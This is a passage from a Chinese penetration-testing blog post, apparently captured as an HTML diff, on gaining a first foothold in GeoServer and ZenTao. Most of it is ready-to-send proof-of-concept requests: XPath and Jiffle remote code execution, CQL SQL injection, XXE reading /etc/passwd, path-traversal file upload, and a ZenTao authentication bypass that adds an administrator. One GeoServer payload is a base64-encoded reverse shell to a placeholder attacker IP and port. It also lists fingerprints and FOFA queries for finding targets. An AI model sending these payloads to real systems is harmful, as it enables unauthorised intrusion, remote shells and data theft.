+<span class="line"><span>Accept-Language: en-US;q=0.9,en;q=0.8</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span></code></pre>
+<p>值得注意的是，GET请求下方一定要空两行，而且这里的payload是先base64再URL编码的（两层编码）</p>
+<p><strong>基于POST方法的poc</strong>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /geoserver/wfs HTTP/1.1</span></span>
+<span class="line"><span>Host: target-ip:8080</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Language: en-US;q=0.9,en;q=0.8</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span>Content-Type: application/xml</span></span>
+<span class="line"><span>Content-Length: 379</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#x3C;wfs:GetPropertyValue service='WFS' version='2.0.0'</span></span>
+<span class="line"><span> xmlns:topp='http://www.openplans.org/topp'</span></span>
+<span class="line"><span> xmlns:fes='http://www.opengis.net/fes/2.0'</span></span>
+<span class="line"><span> xmlns:wfs='http://www.opengis.net/wfs/2.0'></span></span>
+<span class="line"><span>  &#x3C;wfs:Query typeNames='sf:archsites'/></span></span>
+<span class="line"><span>  &#x3C;wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9Zb3VySVAvWW91clBPUlQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')&#x3C;/wfs:valueReference></span></span>
+<span class="line"><span>&#x3C;/wfs:GetPropertyValue></span></span>
+<span class="line"><span></span></span></code></pre>
+<p>payload中的<code>YmFzaCAtaSA+JiAvZGV2L3RjcC9Zb3VySVAvWW91clBPUlQgMD4mMQ==</code>是经过base64编码的命令，避免一些字符破坏RCE的执行</p>
+<p>发送请求之后出现<code>java.lang.ClassCastException</code>错误说明成功，反弹的shell也有了</p>
+<h3 id="ogc-filter-sql注入-cve-2023-25157"><a class="anchor" href="#ogc-filter-sql注入-cve-2023-25157">#</a> OGC Filter SQL注入 CVE-2023-25157</h3>
+<p>影响范围为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GeoServer &#x3C; 2.18.7</span></span>
+<span class="line"><span>2.19.0 &#x3C;= GeoServer &#x3C; 2.19.7</span></span>
+<span class="line"><span>2.20.0 &#x3C;= GeoServer &#x3C; 2.20.7</span></span>
+<span class="line"><span>2.21.0 &#x3C;= GeoServer &#x3C; 2.21.4</span></span>
+<span class="line"><span>2.22.0 &#x3C;= GeoServer &#x3C; 2.22.2</span></span></code></pre>
+<p>利用GeoServer可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作，在版本2.22.1和2.21.4及以前，多个OGC表达式中均存在SQL注入漏洞</p>
+<p>GeoServer支持使用OGC标准规范（如CQL/ECQL表达式或OGC XML Filter）对空间特征数据进行查询过滤，不过在漏洞版本中存在以下缺陷：</p>
+<ul>
+<li><strong>解析过程中的缺陷</strong>：GeoServer在将客户端发起的OGC过滤请求（例如CQL_FILTER或XML Filter）转换成数据库适用的SQL语句时，未对某些特定的函数或表达式参数进行严格的清洗与参数化转义</li>
+<li><strong>拼接SQL</strong>：在处理特定的空间运算函数（如<code>PropertyIsLike</code>、<code>strStartsWith</code>、<code>featureid</code>等）或特殊类型的空间过滤器时，GeoServer直接将用户输入的字符串拼接到SQL查询语句中</li>
+<li>攻击者可以通过构造含有单引号和SQL关键字的攻击载荷闭合原本的查询语句从而实现插入恶意SQL指令</li>
+</ul>
+<p>注：该漏洞的使用需要确定目标服务器中是否存在类型是PostGIS的数据空间（datastore）和工作空间（workspace）,所以需要先去寻找一些参数：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Workspace name</span></span>
+<span class="line"><span>Data store name</span></span>
+<span class="line"><span>Feature type(table) name</span></span>
+<span class="line"><span>One of attribute from feature type</span></span></code></pre>
+<ol>
+<li>
+<p>获取可用要素名称（typeName）：</p>
+<p>在GeoServer中，数据以”层“为单位组织，而<code>typeName</code>的格式通常是<code>Workspace name:Data Store name</code>，可以通过下面的接口获取：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/geoserver/ows?service=WFS&#x26;VERSION=1.0.0&#x26;request=GetCapabilities</span></span></code></pre>
+<p>在返回的XML内容中搜索<code>&lt;FeatureType&gt;</code>标签，其下的子标签<code>&lt;Name&gt;</code>的值就是需要的<code>typeName</code></p>
+</li>
+<li>
+<p>每个可用要素的可用属性</p>
+<p>由于需要知道要操作的具体是哪个数据表的那个字段，所以在后面的poc中使用了<code>strStartsWith</code>函数，因此目标字段需要是字符串类型，利用上一步得到的typeName发送一个<code>GetFeature</code>请求并限制只返回一条记录，但这一步有两个方法以应对不同状况：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 通过查数据的方式查找</span></span>
+<span class="line"><span>/geoserver/ows?service=wfs&#x26;version=1.0.0&#x26;request=GetFeature&#x26;typeName=&#x3C;typeName>&#x26;maxFeatures=1&#x26;outputFormat=json</span></span>
+<span class="line"><span># 该方法需要找到features/properties下面的key，其缺陷在于如果数据为空，那么features/properties下就是空的，连字段名都不会显示</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 通过表结构进行查找，该方法直接查询表结构，直接返回的是表的结构</span></span>
+<span class="line"><span>/geoserver/ows?service=wfs&#x26;version=1.0.0&#x26;request=DescribeFeatureType&#x26;typeName=&#x3C;typeName></span></span>
+<span class="line"><span># 这里我们需要的就是返回值中的&#x3C;xsd:element>标签中的name键的值，之前提到后面的poc会使用strStartsWith，所以需要找到type="xsd:string"字段</span></span></code></pre>
+</li>
+<li>
+<p>sql注入</p>
+<p>利用前面得到的参数，发送如下URL即可触发 SQL注入漏洞查询数据库版本信息：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/geoserver/ows?service=wfs&#x26;version=1.0.0&#x26;request=GetFeature&#x26;typeName=&#x3C;typeName>&#x26;CQL_FILTER=strStartsWith%28&#x3C;propertiesKey>%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true</span></span></code></pre>
+</li>
+</ol>
+<h3 id="jai-ext导致rce-cve-2022-24816cve-2023-35042"><a class="anchor" href="#jai-ext导致rce-cve-2022-24816cve-2023-35042">#</a> JAI-EXT导致RCE CVE-2022-24816/CVE-2023-35042</h3>
+<p>GeoServer使用的JAI-EXT提供的Jiffle地图代数语言，这让使用者可以高效地在大图像上执行地图查询，在JAI-EXT 1.2.21及更早版本中，允许攻击者通过精心构造的Jiffle调用来执行远程代码，影响范围为JAI-EXT &lt; 1.1.22</p>
+<p>该漏洞存在于WMS接口中，攻击者可以通过向<code>/geoserver/wms</code>发送特制的请求来执行任意Java代码，请求中需要包含一个恶意的Jiffle表达式，这个表达式将被服务器执行</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /geoserver/wms HTTP/1.1</span></span>
+<span class="line"><span>Host: localhost:8080</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Language: en-US;q=0.9,en;q=0.8</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span>Content-Type: application/xml</span></span>
+<span class="line"><span>Content-Length: 2191</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#x3C;?xml version="1.0" encoding="UTF-8"?></span></span>
+<span class="line"><span>&#x3C;wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd"></span></span>
+<span class="line"><span>&#x3C;ows:Identifier>ras:Jiffle&#x3C;/ows:Identifier></span></span>
+<span class="line"><span>&#x3C;wps:DataInputs></span></span>
+<span class="line"><span>    &#x3C;wps:Input></span></span>
+<span class="line"><span>    &#x3C;ows:Identifier>coverage&#x3C;/ows:Identifier></span></span>
+<span class="line"><span>    &#x3C;wps:Data></span></span>
+<span class="line"><span>        &#x3C;wps:ComplexData mimeType="application/arcgrid">&#x3C;![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]>&#x3C;/wps:ComplexData></span></span>
+<span class="line"><span>    &#x3C;/wps:Data></span></span>
+<span class="line"><span>    &#x3C;/wps:Input></span></span>
+<span class="line"><span>    &#x3C;wps:Input></span></span>
+<span class="line"><span>    &#x3C;ows:Identifier>script&#x3C;/ows:Identifier></span></span>
+<span class="line"><span>    &#x3C;wps:Data></span></span>
+<span class="line"><span>        &#x3C;wps:LiteralData>dest = y() - (500); // */ public class Double &#123;    public static double NaN = 0;  static &#123; try &#123;  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) &#123; allLines += line; &#125; throw new RuntimeException(allLines);&#125; catch (java.io.IOException e) &#123;&#125; &#125;&#125; /**&#x3C;/wps:LiteralData></span></span>
+<span class="line"><span>    &#x3C;/wps:Data></span></span>
+<span class="line"><span>    &#x3C;/wps:Input></span></span>
+<span class="line"><span>    &#x3C;wps:Input></span></span>
+<span class="line"><span>    &#x3C;ows:Identifier>outputType&#x3C;/ows:Identifier></span></span>
+<span class="line"><span>    &#x3C;wps:Data></span></span>
+<span class="line"><span>        &#x3C;wps:LiteralData>DOUBLE&#x3C;/wps:LiteralData></span></span>
+<span class="line"><span>    &#x3C;/wps:Data></span></span>
+<span class="line"><span>    &#x3C;/wps:Input></span></span>
+<span class="line"><span>&#x3C;/wps:DataInputs></span></span>
+<span class="line"><span>&#x3C;wps:ResponseForm></span></span>
+<span class="line"><span>    &#x3C;wps:RawDataOutput mimeType="image/tiff"></span></span>
+<span class="line"><span>    &#x3C;ows:Identifier>result&#x3C;/ows:Identifier></span></span>
+<span class="line"><span>    &#x3C;/wps:RawDataOutput></span></span>
+<span class="line"><span>&#x3C;/wps:ResponseForm></span></span>
+<span class="line"><span>&#x3C;/wps:Execute></span></span></code></pre>
+<p>这里执行的是<code>id</code>命令，这样数据包中的Jiffle表达式中的Java代码将被服务器执行，执行结果将返回在<code>java,lang.ExceptionInInitializerError</code>消息中</p>
+<h3 id="未授权xml外部实体注入-cve-2025-58360"><a class="anchor" href="#未授权xml外部实体注入-cve-2025-58360">#</a> 未授权XML外部实体注入 CVE-2025-58360</h3>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2601739">CVE-2025-58360｜GeoServer未经授权的XML外部实体注入漏洞（POC）-腾讯云开发者社区-腾讯云</a></p>
+<p>影响范围为GeoServer &lt;2.25.6；2.26.0 &lt;= GeoServer &lt; 2.26.2</p>
+<p>该漏洞存在于<code>/geoserver/wms</code>端点的WMS GetMap请求中，当服务器收到XML样形式的SLD样式定义时，由于解析器未正确禁用外部实体，攻击者可构造恶意XML注入实体引用，进而读取服务器任意敏感文件、获取系统信息、触发SSRF或导致拒绝服务</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /geoserver/wms?service=WMS&#x26;version=1.1.0&#x26;request=GetMap&#x26;layers=topp:states&#x26;bbox=-130,24,-66,50&#x26;width=800&#x26;height=400&#x26;srs=EPSG:4326&#x26;format=image/png HTTP/1.1</span></span>
+<span class="line"><span>Host: ip</span></span>
+<span class="line"><span>Content-Type: application/vnd.ogc.sld+xml</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#x3C;?xml version="1.0" encoding="UTF-8"?></span></span>
+<span class="line"><span>  &#x3C;!DOCTYPE StyledLayerDescriptor [</span></span>
+<span class="line"><span>  &#x3C;!ENTITY xxe SYSTEM "file:///etc/passwd"></span></span>
+<span class="line"><span>  ]></span></span>
+<span class="line"><span>&#x3C;StyledLayerDescriptor version="1.0.0" xmlns="http://www.opengis.net/sld"></span></span>
+<span class="line"><span>  &#x3C;NamedLayer></span></span>
+<span class="line"><span>    &#x3C;Name>&#x26;xxe;&#x3C;/Name></span></span>
+<span class="line"><span>    &#x3C;UserStyle/></span></span>
+<span class="line"><span>  &#x3C;/NamedLayer></span></span>
+<span class="line"><span>&#x3C;/StyledLayerDescriptor></span></span></code></pre>
+<h3 id="文件上传漏洞-cve-2023-51444"><a class="anchor" href="#文件上传漏洞-cve-2023-51444">#</a> 文件上传漏洞 CVE-2023-51444</h3>
+<p>影响范围为GeoServer &lt; 2.23.4；2.24.0 &lt;= GeoServer &lt; 2.24.1</p>
+<p>该漏洞存在于GeoServer的REST Coverage Store API模块中，允许攻击者利用路径便利缺陷将任意文件写入到服务器的任意位置。</p>
+<p>GeoServer的REST接口允许用户上传数据（如ZIP压缩包）来配制和管理栅格数据存储（Coverage Stores），当GeoServer使用相对路径配置存储时，系统会调用具备路径遍历防护机制的<code>Resource</code>接口实现，能够成功拦截包含<code>../</code>的恶意路径。当系统使用绝对路径配置存储时，GeoServer会调用另一个不同的代码实现，而该实现完全没有执行路径遍历安全验证，攻击者可以在REST API请求参数（如<code>filename</code>）中注入<code>../../../../../../</code>目录跳转绕过限制，将恶意文件写入服务器上的任意目录</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /geoserver/rest/workspaces/&#x3C;WORKSPACE_NAME>/coveragestores/&#x3C;WAREHOUSE_NAME>/file.geotiff?filename=../../../ROOT/1.txt HTTP/1.1</span></span>
+<span class="line"><span>Host: X</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Length:1</span></span>
+<span class="line"><span>sec-ch-ua:"Not/A)Brand";v="8","Chromium";v="126","Google Chrome";v="126"</span></span>
+<span class="line"><span>sec-ch-ua-mobile:?0</span></span>
+<span class="line"><span>User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/119.0.0.0Safari/537.36</span></span>
+<span class="line"><span>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span></span>
+<span class="line"><span>Accept: application/xml, text/xml,*/*; q=0.01</span></span>
+<span class="line"><span>Wicket-Ajax-BaseURL: wicket/page?19</span></span>
+<span class="line"><span>X-Requested-With: XMLHttpRequest</span></span>
+<span class="line"><span>Wicket-Ajax: true</span></span>
+<span class="line"><span>sec-ch-ua-platform: "Windows"</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.9</span></span>
+<span class="line"><span>1</span></span></code></pre>
+<p>不过似乎需要先通过：工作区-&gt;新建工作区-&gt;数据源 ImageMosaic创建一个工作空间</p>
+<h3 id="xpath-rce-cve-2024-36401"><a class="anchor" href="#xpath-rce-cve-2024-36401">#</a> XPath RCE CVE-2024-36401</h3>
+<p>影响范围为GeoServer &lt; 2.23.6；2.24.0 &lt;= GeoServer &lt; 2.24.4；2.25.0 &lt;= GeoServer &lt; 2.25.2</p>
+<p>该漏洞是GeoServer及底层的GeoTools库存在的一个未经身份验证的代码执行漏洞，该漏洞的核心问题在于GeoServer对XPath表达式的不安全解析机制，导致攻击者可以通过反射调用Java的底层类方法进而执行任意系统命令</p>
+<p>GeoServer在处理OGC标准的请求时，允许客户端通过特定参数（如<code>propertyName</code>）来查询或过滤复杂的地理特征参数，为了解析这些属性名，GeoServer引入了XPath表达式支持。</p>
+<ul>
+<li>GeoServer底层使用Apache Commons JXPath库来执行XPath计算</li>
+<li>JXPath库在设计时包含了一个特性：允许在XPath表达式中通过扩展函数来实例化Java类并调用其方法（例如反射调用<code>java.lang.Runtime</code>）</li>
+</ul>
+<p>该漏洞的攻击面非常广，因为多个标准的OGC服务接口都支持属性名称参数解析，未经身份验证的远程攻击者可以通过构造恶意的GET和POST请求，向以下任意一个受影响的接口发送Payload即可触发RCE：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>WFS:GetFeature、GetPropertyValue</span></span>
+<span class="line"><span>WMS:GetMap、GetFeatureInfo、GetLegendGraphic</span></span>
+<span class="line"><span>WPS:Execute请求</span></span></code></pre>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /geoserver/ows HTTP/1.1</span></span>
+<span class="line"><span>Host: X</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>sec-ch-ua:"Not/A)Brand";v="8","Chromium";v="126","Google Chrome";v="126"</span></span>
+<span class="line"><span>sec-ch-ua-mobile:?0</span></span>
+<span class="line"><span>User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/119.0.0.0Safari/537.36</span></span>
+<span class="line"><span>sec-ch-ua-platform:"Windows"</span></span>
+<span class="line"><span>Accept:*/*</span></span>
+<span class="line"><span>Sec-Fetch-Site: same-origin</span></span>
+<span class="line"><span>Sec-Fetch-Mode: no-cors</span></span>
+<span class="line"><span>Sec-Fetch-Dest: script</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.9</span></span>
+<span class="line"><span>Content-Type: application/xml</span></span>
+<span class="line"><span>Content-Length: 314</span></span>
+<span class="line"><span>&#x3C;wfs:GetPropertyValue service='WFS' version='2.0.0'</span></span>
+<span class="line"><span> xmlns:topp='http://www.openplans.org/topp'</span></span>
+<span class="line"><span> xmlns:fes='http://www.opengis.net/fes/2.0'</span></span>
+<span class="line"><span> xmlns:wfs='http://www.opengis.net/wfs/2.0'</span></span>
+<span class="line"><span> valueReference='exec(java.lang.Runtime.getRuntime(),"^ ^")'></span></span>
+<span class="line"><span> &#x3C;wfs:Query typeNames='topp:states'/></span></span>
+<span class="line"><span>&#x3C;/wfs:GetPropertyValue></span></span></code></pre>
+<h2 id="禅道"><a class="anchor" href="#禅道">#</a> 禅道</h2>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1709768">什么是CMS，网站内容管理系统（CMS）详解与建站指南-阿里云开发者社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76988707/article/details/135695355">禅道：项目管理与协作工具的全面指南-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.takake.com/posts/8399/#%E4%BA%8C-%E7%A6%85%E9%81%93%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E">禅道漏洞 | 高木のBlog</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/444382.html">禅道各版本漏洞复现汇总上篇 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/444384.html">禅道各版本漏洞复现汇总下篇 - FreeBuf网络安全行业门户</a></p>
+<p>CMS系统：网站内容管理系统（Content Management System），是一种基于服务器的软件应用程序，它允许用户通过直观地界面创建、编辑、组织和发布数字内容，而无需专业的编程知识。CMS将网站的内容与网站的设计分离开来，使得内容更新和维护变得高效便捷</p>
+<p>禅道是一款开源的项目管理系统和协同工具，旨在帮助团队高效地进行项目管理、任务分配和团队协作，它提供了丰富的功能和工具，以支持项目的规划、跟踪和控制，其主要特点和功能包括<strong>项目管理</strong>、<strong>任务管理</strong>、<strong>缺陷管理</strong>、<strong>文档管理</strong>、<strong>团队协作</strong>、<strong>报表和统计</strong></p>
+<h3 id="指纹特征-3"><a class="anchor" href="#指纹特征-3">#</a> 指纹特征</h3>
+<ul>
+<li>
+<p>HTTP响应头与Cookie特征：禅道在会话管理中使用了独特的Session ID名称</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Set-Cookie: zentaosid=xxxxxxxxxxxxxxxxxxxxxx;</span></span></code></pre>
+</li>
+<li>
+<p>URL目录与路径特征：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 默认根路径</span></span>
+<span class="line"><span>## 开源版常见</span></span>
+<span class="line"><span>/zentao/</span></span>
+<span class="line"><span>## 专业版</span></span>
+<span class="line"><span>/pro/</span></span>
+<span class="line"><span>## 企业版</span></span>
+<span class="line"><span>/biz/</span></span>
+<span class="line"><span>## 旗舰版</span></span>
+<span class="line"><span>/max/</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 典型登录页面</span></span>
+<span class="line"><span>/zentao/user-login.hrml</span></span>
+<span class="line"><span>/user-login.html</span></span>
+<span class="line"><span>/zentao/user-login-L3plbnRhby8=.html</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 静态资源特征路径</span></span>
+<span class="line"><span>/zentao/theme/default/style.css</span></span></code></pre>
+</li>
+<li>
+<p>HTML源码与DOM特征：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># Title标签</span></span>
+<span class="line"><span>&#x3C;title>用户登录 - 禅道&#x3C;/title></span></span>
+<span class="line"><span>&#x3C;title>登录 - 禅道&#x3C;/title></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># JS配置对象，页面&#x3C;head>内嵌的全局变量</span></span>
+<span class="line"><span>var config=&#123;"webRoot":"\/","appName":"","cookieLife":30,"requestType":"PATH_INFO"&#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># body样式</span></span>
+<span class="line"><span>&#x3C;body class='m-user-login'></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 底部版权信息</span></span>
+<span class="line"><span>&#x3C;a href="[htp://ww.zentao.net](http://www.zentao.net)" target="_blank">禅道项目管理软件&#x3C;/a></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 隐藏Input</span></span>
+<span class="line"><span>&#x3C;input type='hidden' name='keepLogin' id='keepLogin' value='0' /></span></span></code></pre>
+</li>
+<li>
+<p>fofa语法：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>app="禅道项目管理软件"</span></span>
+<span class="line"><span>header="zentaosid"</span></span>
+<span class="line"><span>body="m-user-login" &#x26;&#x26; title="禅道"</span></span></code></pre>
+</li>
+</ul>
+<h3 id="身份认证绕过漏洞-qvd-2024-15263"><a class="anchor" href="#身份认证绕过漏洞-qvd-2024-15263">#</a> 身份认证绕过漏洞 QVD-2024-15263</h3>
+<p>影响范围为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 开源版</span></span>
+<span class="line"><span>16.x &#x3C;= 禅道 &#x3C; 18.12</span></span>
+<span class="line"><span># 企业版</span></span>
+<span class="line"><span>6.x &#x3C;= 禅道 &#x3C; 8.12</span></span>
+<span class="line"><span># 旗舰版</span></span>
+<span class="line"><span>3.x &#x3C;= 禅道 &#x3C; 4.12</span></span></code></pre>
+<p>该漏洞的核心在于攻击者可以通过构造特定请求来绕过身份认证，调用任意API接口，结合其他漏洞可以完全控制服务器</p>
+<p>poc：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GET /api.php?m=testcase&#x26;f=savexmindimport&#x26;HTTP_X_REQUESTED_WITH=XMLHttpRequest&#x26;productID=hxsjoqkyiveutbzwlvjv&#x26;branch=rbpcotcxawqpqhvhqfpp HTTP/1.1</span></span>
+<span class="line"><span>Host: your-ip</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.9</span></span>
+<span class="line"><span>sec-ch-ua-platform: "Windows"</span></span>
+<span class="line"><span>sec-ch-ua: "Google Chrome";v="109", "Chromium";v="109", "Not=A?Brand";v="24"</span></span>
+<span class="line"><span>sec-ch-ua-mobile: ?0</span></span>
+<span class="line"><span>Connection: close</span></span></code></pre>
+<p>该poc可以实现获取伪造的绘画cookie，进而添加管理员并登录系统</p>
+<h3 id="sql注入-cnvd-2022-42853"><a class="anchor" href="#sql注入-cnvd-2022-42853">#</a> SQL注入 CNVD-2022-42853</h3>
+<p>影响范围为：开源版16.5、16.5beta1；企业版6.5；旗舰版3.0</p>
+<p>禅道16.5及早期版本的登录接口未对用户输入的<code>account</code>参数进行过滤，攻击者可以通过构造恶意的SQL语句拼接至数据库查询中，导致敏感信息泄露</p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-09-05 22:25:03" itemprop="dateModified" datetime="2026-09-05T22:25:03+08:00">2026-09-05</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/09/05/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART4/" title="常规外网打点-PART4">https://zlaryy.top/2026/09/05/常规外网打点-PART4/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture5.webp" title="常规外网打点-PART3"><span class="type">上一篇</span><h3>常规外网打点-PART3</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" 